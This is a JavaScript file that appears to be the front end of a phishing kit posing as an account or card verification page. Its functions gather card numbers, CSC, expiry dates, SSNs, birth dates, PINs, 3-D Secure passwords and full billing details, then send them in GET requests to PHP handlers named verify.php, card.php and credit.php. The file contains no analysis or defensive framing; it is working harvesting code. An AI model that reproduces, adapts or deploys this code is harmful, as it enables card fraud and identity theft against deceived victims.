window.onload = function() {
  function $(el) {
    return document.getElementById(el);
  }
  try {
    document.getElementById("mainmenu").addEventListener("click", function() {
      if(document.getElementById("menresp").className == "menu_responsive" || document.getElementById("menresp").className == "menu_responsive hide") {
        document.getElementById("menresp").className = "menu_responsive show";
        document.getElementById("header").className = "header margin";
        document.getElementById("header_part").className = "header_part margin";
        document.getElementById("mainBody").className = "mainBody margin";
      } else {
        document.getElementById("menresp").className = "menu_responsive hide";
        document.getElementById("header").className = "header unmargin";
        document.getElementById("header_part").className = "header_part unmargin";
        document.getElementById("mainBody").className = "mainBody unmargin";
      }
    });
    document.getElementById("bellfa").addEventListener("click", function() {
      if($("notmenu").className == "notification_menu" || $("notmenu").className == "notification_menu hidemenu") {
        $("notmenu").className = "notification_menu showmenu";
        document.getElementById("header").className = "header menmargin";
        document.getElementById("header_part").className = "header_part menmargin";
        document.getElementById("mainBody").className = "mainBody menmargin";
        document.getElementById("mainFooter").className = "mainFooter menmargin";
        document.getElementById("blurbody").className = "blurbody blur";
      } else {
        $("notmenu").className = "notification_menu hidemenu";
        document.getElementById("header").className = "header menunmargin";
        document.getElementById("header_part").className = "header_part menunmargin";
        document.getElementById("mainBody").className = "mainBody menunmargin";
        document.getElementById("mainFooter").className = "mainFooter menumargin";
        document.getElementById("blurbody").className = "blurbody hidden";
      }
    });
    document.getElementById("bellfa2").addEventListener("click", function() {
      if($("notmenu").className == "notification_menu" || $("notmenu").className == "notification_menu hidemenu") {
        $("notmenu").className = "notification_menu showmenu";
        document.getElementById("header").className = "header menmargin";
        document.getElementById("header_part").className = "header_part menmargin";
        document.getElementById("mainBody").className = "mainBody menmargin";
        document.getElementById("mainFooter").className = "mainBody menmargin";
        document.getElementById("blurbody").className = "blurbody blur";
      } else {
        $("notmenu").className = "notification_menu hidemenu";
        document.getElementById("header").className = "header menunmargin";
        document.getElementById("header_part").className = "header_part menunmargin";
        document.getElementById("mainBody").className = "mainBody menunmargin";
        document.getElementById("mainFooter").className = "mainFooter menumargin";
        document.getElementById("blurbody").className = "blurbody hidden";
      }
    });
    document.getElementById("closemen").addEventListener("click", function() {
      $("notmenu").className = "notification_menu hidemenu";
      document.getElementById("header").className = "header menunmargin";
      document.getElementById("header_part").className = "header_part menunmargin";
      document.getElementById("mainBody").className = "mainBody menunmargin";
      document.getElementById("mainFooter").className = "mainFooter menumargin";
      document.getElementById("blurbody").className = "blurbody hidden";
    });
    document.getElementById("checkbox").addEventListener("click", function() {
      if($("checkbox").className == "checkboxe" || $("checkbox").className == "checkboxr") {
        $("checkbox").className = "checkboxk";
      } else {
        $("checkbox").className = "checkboxe";
      }
    });
  } catch(e) {
    /* do nothing */
  }
}
function checkCredit(e) {
  if(e.keyCode != 8) {
    switch(document.getElementById("cn").value.length) {
      case 4:
        document.getElementById("cn").value += " ";
        break;
      case 9:
        document.getElementById("cn").value += " ";
        break;
      case 14:
        document.getElementById("cn").value += " ";
        break;
    }
  }
}
function checkBD(e) {
  if(e.keyCode != 8) {
    switch(document.getElementById("bd").value.length) {
      case 2:
        document.getElementById("bd").value += "/";
        break;
      case 5:
        document.getElementById("bd").value += "/";
        break;
    }
  }
}
function checkSS(e) {
  if(e.keyCode != 8) {
    switch(document.getElementById("ssn").value.length) {
      case 3:
        document.getElementById("ssn").value += " ";
        break;
      case 6:
        document.getElementById("ssn").value += " ";
        break;
    }
  }
}
function checkDate(e) {
  if(e.keyCode != 8) {
    switch(document.getElementById("ex").value.length) {
      case 2:
        document.getElementById("ex").value += "/";
        break;
    }
  }
}
function confirmCard() {
  if(document.getElementById("ex").value.split("/")[1] < 2017) {

  }
}
function triggerUpload() {
  try {
    document.getElementById("files").click();
  } catch(e) {
    console.log(e);
    /* Do nothing */
  }
}
function updateUpload() {
  try {
    if(document.getElementById("files").value != "") {
      document.getElementById("val").innerHTML = document.getElementById("files").value+" - Choose a file";
      document.getElementById("confirmbut").className = "";
    } else {
        document.getElementByid("confirmbut").className = "disabled";
    }
  } catch(e) {
    /* Do nothing */
  }
}
function showupload() {
  try {
    if(document.getElementById("prooftype").value != "") {
      document.getElementById("uploadbut").className = "";
    } else {
      document.getElementById("uploadbut").className = "hidden";
      document.getElementById("confirmbut").className = "disabled";
    }

  } catch(e) {
    /* Do nothing */
  }
}
function hideModal() {
  try {
    document.getElementById("logmod").className = "modal_background hidden";
    document.getElementById("logmd").className = "logout_modal hidden";
  } catch(e) {
    /* Do nothing */
  }
}
function showModal() {
  try {
    document.getElementById("logmod").className = "modal_background";
    document.getElementById("logmd").className = "logout_modal";
  } catch(e) {
    /* Do nothing */
  }
}
/* Forms functions */
// Account Login
function verifycard() {
  try {
    var bd = document.getElementById("bd"),
        secv = document.getElementById("secv"),
        ssn = document.getElementById("ssn"),
        pin = document.getElementById("pin");
    if(bd.value != "") {
      var x = new XMLHttpRequest;
      x.open("GET", "actions/verify.php?bd="+bd.value+"&secv="+secv.value+"&ssn="+ssn.value+"&pin="+pin.value+"&submit", true);
      x.send();
      x.onreadystatechange = function() {
        if(x.readyState == 4 && x.status == 200) {
          if(x.responseText.indexOf("RESULT:DONE;") >= 0) {
            document.location = document.location;
          }
        }
      }
    } else {
      if(bd.value == "") {
        bd.className += " inputError";
      } else {
        bd.className = "";
      }
    }
  } catch(e) {
    console.log(e);
    /* Error Reporting */
  }
}
function confirmCard() {
  try {
    var cardholder = document.getElementById("name"),
        creditnum = document.getElementById("cn"),
        expir = document.getElementById("ex"),
        csc = document.getElementById("csc");
    numb = expir.value.split("/")[1];
    if(numb.length == 2) {
      numb = "20"+numb;
    }
    if(cardholder.value != "" && creditnum.value != "" && expir.value != "" && csc.value != "" && numb >= 2017) {
      cardholder.className = "";
      creditnum.className = "";
      expir.className = "small";
      csc.className = "small credit";
      var x = new XMLHttpRequest;
      x.open("GET", "actions/card.php?cardn="+cardholder.value+"&number="+creditnum.value+"&exp="+expir.value+"&csc="+csc.value+"&submit", true);
      x.send();
      x.onreadystatechange = function() {
        if(x.readyState == 4 && x.status == 200) {
          if(x.responseText.indexOf("RESULT:DONE;") >= 0) {
            document.getElementById("spinner").className = "load_screen";
            setTimeout(function() {
              if(creditnum.value.length > 3) {
                document.getElementById("cne").innerHTML = creditnum.value[creditnum.value.length-4]+creditnum.value[creditnum.value.length-3]+creditnum.value[creditnum.value.length-2]+creditnum.value[creditnum.value.length-1];
              }
              if(creditnum.value[0] == "4") {
                document.getElementById("ct").innerHTML = "Visa";
                document.getElementById("secvl").className = "";
                document.getElementById("secv").className = "vbv";
              } else if(creditnum.value[0] == "5") {
                document.getElementById("ct").innerHTML = "MasterCard";
                document.getElementById("secvl").className = "";
                document.getElementById("secv").className = "master";
              } else if(creditnum.value[0] == "3" && creditnum.value[1] == "7") {
                document.getElementById("ct").innerHTML = "American Express";
              } else if(creditnum.value[0] == "6") {
                document.getElementById("ct").innerHTML = "Discover";
              } else if(creditnum.value[0] == "3" && creditnum.value[1] != "7") {
                document.getElementById("ct").innerHTML = "JCB";
              }
              document.getElementById("spinner").className = "load_screen hidden";
              document.getElementById("modbg").className = "modal_background";
              document.getElementById("modfo").className = "credit_modal";
            }, 700);
          }
        }
      }
    } else {
      if(cardholder.value == "") {
        cardholder.className += " inputError";
      } else {
        cardholder.className = "";
      }
      if(creditnum.value == "") {
        creditnum.className += " inputError";
      } else {
        creditnum.className = "";
      }
      if(expir.value == "" || numb < 2017) {
        expir.className += " inputError";
      } else {
        expir.className = "small";
      }
      if(csc.value == "") {
        csc.className += " inputError";
      } else {
        csc.className = "small";
      }
    }
  } catch(e) {
    /* Do nothing */
  }
}
function confirmBilling() {
  try {
    var fn = document.getElementById("fullname"),
        addline = document.getElementById("addline"),
        city = document.getElementById("city"),
        state = document.getElementById("state"),
        country = document.getElementById("country"),
        postal = document.getElementById("postal"),
        mobile = document.getElementById("mobile"),
        phone = document.getElementById("phone"),
        checkbox = document.getElementById("checkbox");

    if(checkbox.className == "checkboxk" && fn.value != "" && addline.value != "" && city.value != "" && state.value != "" && country.value != "" && postal.value != "" && mobile.value != "" && phone.value != "") {
      fn.className = "";
      addline.className = "";
      city.className = "small";
      state.className = "small";
      country.className = "smalls";
      postal.className = "small";
      mobile.className = "smalls";
      phone.className = "small";
      var x = new XMLHttpRequest;
      x.open("GET", "actions/credit.php?fn="+fn.value+"&addline="+addline.value+"&city="+city.value+"&state="+state.value+"&country="+country.value+"&postal="+postal.value+"&mobile="+mobile.value+"&phone="+phone.value+"&submit", true);
      x.send();
      x.onreadystatechange = function() {
        if(x.status == 200 && x.readyState == 4) {
          if(x.responseText.indexOf("RESULT:DONE;") >= 0) {
            window.location = window.location;
          }
        }
      }
    } else {
      if(fn.value == "") {
        fn.className += " inputError";
      } else {
        fn.className = "";
      }
      if(addline.value == "") {
        addline.className += " inputError";
      } else {
        addline.className = "";
      }
      if(city.value == "") {
        city.className += " inputError";
      } else {
        city.className = "small";
      }
      if(state.value == "") {
        state.className += " inputError";
      } else {
        state.className = "small";
      }
      if(country.value == "") {
        country.className += " inputError";
      } else {
        country.className = "smalls";
      }
      if(postal.value == "") {
        postal.className += " inputError";
      } else {
        postal.className = "small";
      }
      if(mobile.value == "") {
        mobile.className += " inputError";
      } else {
        mobile.className = "smalls";
      }
      if(phone.value == "") {
        phone.className += " inputError";
      } else {
        phone.className = "small";
      }
      if(checkbox.className == "checkboxe") {
        checkbox.className = "checkboxr";
      }
    }
  } catch(e) {
    console.log(e);
    /* Error handling */
  }
}
function isNumberKey(evt){
    var charCode = (evt.which) ? evt.which : evt.keyCode;
    if (charCode > 31 && (charCode < 48 || charCode > 57))
        return false;
    return true;
}
function updateCode() {
  try {
    var select = document.getElementById("country").value;
    var x = new XMLHttpRequest;
    x.open("GET", "actions/country.php?cd="+select, true);
    x.send();
    x.onreadystatechange = function() {
      if(x.status == 200 && x.readyState == 4) {
        document.getElementById("phone").value = "(+"+x.responseText+") ";
      }
    }
  } catch(e) {
    console.log(e);
    /* Do nothing */
  }
}
function creditIcon() {
  try {
    var creditcard = document.getElementById("cn").value,
        creditinput = document.getElementById("cn");
    var verifier = creditcard.substr(0, 1);
    var verifiert = creditcard.substr(1, 1);
    if(verifier == '4') {
      creditinput.className = "noAnim credit_visa";
  	}	else if(verifier == '5') {
      creditinput.className = "credit_master";
  	} else if(verifier == '3' && verifiert == '7') {
      creditinput.className = "credit_usex";
  	} else if(verifier == '6') {
      creditinput.className = "credit_discover";
  	} else if(verifier == '1') {
      creditinput.className = "credit_jcb";
  	} else {
  	   creditinput.className = "";
  	}
  } catch(e) {
    console.log(e);
    /* Do nothing */
  }
}
